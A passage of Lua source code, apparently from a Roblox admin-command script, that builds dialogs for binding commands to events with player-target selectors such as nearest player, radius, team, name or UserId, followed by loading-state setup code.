											DoNotif("Command '"..tostring(cmdName).."' not found."); return
										end
										Insert(Bindings[ev], "<nearest> "..input)
										NAmanage.SaveBinders()
										refreshItems()
									end
								}}
							})
						end
					})

					Insert(B, {
						Text = "Farthest",
						Callback = function()
							Window({
								Title = ev.." Binders",
								Description = "Enter command (target: <farthest>)",
								InputField = true,
								Buttons = {{
									Text = "Submit",
									Callback = function(input)
										const cmdName = input and input:match("^(%S+)")
										if not (cmdName and (cmds.Commands[Lower(cmdName)] or cmds.Aliases[Lower(cmdName)])) then
											DoNotif("Command '"..tostring(cmdName).."' not found."); return
										end
										Insert(Bindings[ev], "<farthest> "..input)
										NAmanage.SaveBinders()
										refreshItems()
									end
								}}
							})
						end
					})

					Insert(B, {
						Text = "Random…",
						Callback = function()
							Window({
								Title = "Random Count",
								Description = "How many random players? (e.g. 1, 3, 5)",
								InputField = true,
								Buttons = {{
									Text = "Next",
									Callback = function(n)
										n = tonumber(n) or 1
										n = math.max(1, math.floor(n))
										const prefix = "<#"..tostring(n).."> "
										Window({
											Title = ev.." Binders",
											Description = "Enter command (target: "..prefix..")",
											InputField = true,
											Buttons = {{
												Text = "Submit",
												Callback = function(input)
													const cmdName = input and input:match("^(%S+)")
													if not (cmdName and (cmds.Commands[Lower(cmdName)] or cmds.Aliases[Lower(cmdName)])) then
														DoNotif("Command '"..tostring(cmdName).."' not found."); return
													end
													Insert(Bindings[ev], prefix..input)
													NAmanage.SaveBinders()
													refreshItems()
												end
											}}
										})
									end
								}}
							})
						end
					})

					Insert(B, {
						Text = "Radius…",
						Callback = function()
							Window({
								Title = "Radius (studs)",
								Description = "Players within this radius of you (e.g. 25)",
								InputField = true,
								Buttons = {{
									Text = "Next",
									Callback = function(r)
										r = tonumber(r) or 25
										r = math.max(1, math.floor(r))
										const prefix = "<rad"..tostring(r).."> "
										Window({
											Title = ev.." Binders",
											Description = "Enter command (target: "..prefix..")",
											InputField = true,
											Buttons = {{
												Text = "Submit",
												Callback = function(input)
													const cmdName = input and input:match("^(%S+)")
													if not (cmdName and (cmds.Commands[Lower(cmdName)] or cmds.Aliases[Lower(cmdName)])) then
														DoNotif("Command '"..tostring(cmdName).."' not found."); return
													end
													Insert(Bindings[ev], prefix..input)
													NAmanage.SaveBinders()
													refreshItems()
												end
											}}
										})
									end
								}}
							})
						end
					})

					Insert(B, {
						Text = "Team prefix…",
						Callback = function()
							Window({
								Title = "Team Prefix",
								Description = "e.g. red / blu / gua",
								InputField = true,
								Buttons = {{
									Text = "Next",
									Callback = function(prefix)
										prefix = tostring(prefix or ""):gsub("%s+","")
										if prefix == "" then DoNotif("Team prefix cannot be empty."); return end
										const sel = "<%"..prefix.."> "
										Window({
											Title = ev.." Binders",
											Description = "Enter command (target: "..sel..")",
											InputField = true,
											Buttons = {{
												Text = "Submit",
												Callback = function(input)
													const cmdName = input and input:match("^(%S+)")
													if not (cmdName and (cmds.Commands[Lower(cmdName)] or cmds.Aliases[Lower(cmdName)])) then
														DoNotif("Command '"..tostring(cmdName).."' not found."); return
													end
													Insert(Bindings[ev], sel..input)
													NAmanage.SaveBinders()
													refreshItems()
												end
											}}
										})
									end
								}}
							})
						end
					})

					Insert(B, {
						Text = "Specific player…",
						Callback = function()
							Window({
								Title = "Player Name (prefix ok)",
								Description = "Example: coolguy / coo",
								InputField = true,
								Buttons = {{
									Text = "Next",
									Callback = function(name)
										name = tostring(name or ""):gsub("^%s+",""):gsub("%s+$","")
										if name == "" then DoNotif("Name cannot be empty."); return end
										const sel = "<player:"..name.."> "
										Window({
											Title = ev.." Binders",
											Description = "Enter command (target: "..sel..")",
											InputField = true,
											Buttons = {{
												Text = "Submit",
												Callback = function(input)
													const cmdName = input and input:match("^(%S+)")
													if not (cmdName and (cmds.Commands[Lower(cmdName)] or cmds.Aliases[Lower(cmdName)])) then
														DoNotif("Command '"..tostring(cmdName).."' not found."); return
													end
													Insert(Bindings[ev], sel..input)
													NAmanage.SaveBinders()
													refreshItems()
												end
											}}
										})
									end
								}}
							})
						end
					})

					Insert(B, {
						Text = "UserId…",
						Callback = function()
							Window({
								Title = "UserId",
								Description = "Numbers only",
								InputField = true,
								Buttons = {{
									Text = "Next",
									Callback = function(id)
										id = tonumber(id)
										if not id then DoNotif("Invalid UserId."); return end
										const sel = "<id:"..tostring(id).."> "
										Window({
											Title = ev.." Binders",
											Description = "Enter command (target: "..sel..")",
											InputField = true,
											Buttons = {{
												Text = "Submit",
												Callback = function(input)
													const cmdName = input and input:match("^(%S+)")
													if not (cmdName and (cmds.Commands[Lower(cmdName)] or cmds.Aliases[Lower(cmdName)])) then
														DoNotif("Command '"..tostring(cmdName).."' not found."); return
													end
													Insert(Bindings[ev], sel..input)
													NAmanage.SaveBinders()
													refreshItems()
												end
											}}
										})
									end
								}}
							})
						end
					})

					Insert(B, {
						Text = "Custom term(s)…",
						Callback = function()
							Window({
								Title = "Custom PlayerArgs terms",
								Description = "Comma-separated: nearest,%blu,#3,group123,rad25",
								InputField = true,
								Buttons = {{
									Text = "Next",
									Callback = function(term)
										term = tostring(term or ""):gsub("%s+", "")
										if term == "" then DoNotif("Enter at least one term."); return end
										const sel = "<"..term.."> "
										Window({
											Title = ev.." Binders",
											Description = "Enter command (target: "..sel..")",
											InputField = true,
											Buttons = {{
												Text = "Submit",
												Callback = function(input)
													const cmdName = input and input:match("^(%S+)")
													if not (cmdName and (cmds.Commands[Lower(cmdName)] or cmds.Aliases[Lower(cmdName)])) then
														DoNotif("Command '"..tostring(cmdName).."' not found."); return
													end
													Insert(Bindings[ev], sel..input)
													NAmanage.SaveBinders()
													refreshItems()
												end
											}}
										})
									end
								}}
							})
						end
					})

					return B
				end)()
			})
		end)

		refreshItems()
		layoutOrder = layoutOrder + 1
		Wait()
	end
end)

-- [[ GUI ELEMENTS ]] --

--[[

NAgui.addToggle("Toggle Button", true, function(state)
	print("State:", state)
end)

NAgui.addColorPicker("Color Picker", Color3.fromRGB(200, 50, 100), function(color)
	print("Selected Color:", color)
end)

NAgui.addButton("button", function()
	print'pressed button'
end)

NAgui.addSection("Section Label")

NAgui.addInput("Input Label", "Placeholder", "", function(text)
	print("Input:", text)
end)

NAgui.addKeybind("Toggle Key", "F", function(key)
	print("key triggered:", key)
end)

NAgui.addSlider("Slider", 0, 100, 50, 5, "%", function(val) -- min, max, default, add, suffix
	print("Slider Value:", val)
end)

]]

NAmanage.finalizeLoadingState = NAmanage.finalizeLoadingState or function()
	if NAStuff._loadingFinalizedOnce == true then
		NAStuff._loadingFinalizePending = false
		if type(NAmanage.queueStartupAssetPreload) == "function" then
			NAmanage.queueStartupAssetPreload()
		end
		return
	end
	const st = NAgui and NAgui.SettingsBuildState
	if NAStuff.SettingsBuildRunning == true or (type(st) == "table" and st.building == true) then
		if NAAssetsLoading and NAAssetsLoading.setStatus then
			pcall(NAAssetsLoading.setStatus, "building settings in background")
		end
	end
	if type(NAmanage.completeStartupLoading) == "function" then
		NAmanage.completeStartupLoading("ready")
	end
end

NAStuff._loadingFinalizePending = NAStuff._loadingFinalizedOnce ~= true
NAStuff.SettingsBuildDeferredMobile = false
NAStuff.SettingsBuildRunning = true
NAStuff.SettingsBuildReady = false
NAgui.SettingsBuildState = NAgui.SettingsBuildState or {}
NAgui.SettingsBuildState.background = true
NAgui.SettingsBuildState.userInteracted = false
NAgui.SettingsBuildState.userSelectedTab = nil
if NAgui.setSettingsTabContext then
	NAgui.setSettingsTabContext(nil)
end
if NAmanage.pumpLoaderQueue then
	pcall(NAmanage.pumpLoaderQueue)
end
